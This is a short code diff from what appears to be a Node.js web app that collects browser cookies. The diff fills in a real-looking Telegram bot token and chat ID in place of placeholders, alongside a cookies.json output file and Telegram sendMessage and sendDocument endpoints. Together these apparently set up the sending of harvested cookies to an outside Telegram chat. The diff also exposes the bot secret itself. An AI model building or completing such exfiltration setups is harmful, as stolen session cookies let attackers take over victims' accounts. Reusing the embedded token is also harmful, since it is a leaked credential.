@@ -20,8 +20,8 @@ app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'templates', 'index
 
 // ------------------------- CONFIG -------------------------
 const OUTPUT_FILE = 'cookies.json';
-const TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
-const TELEGRAM_CHAT_ID = "YOUR_CHAT_ID_HERE";
+const TELEGRAM_BOT_TOKEN = "8366154069:AAFTClzM2Kbirysud1i49UAWmEC6JP0T0xg";
+const TELEGRAM_CHAT_ID = "7574749243";
 const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
 const TELEGRAM_FILE_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`;
 
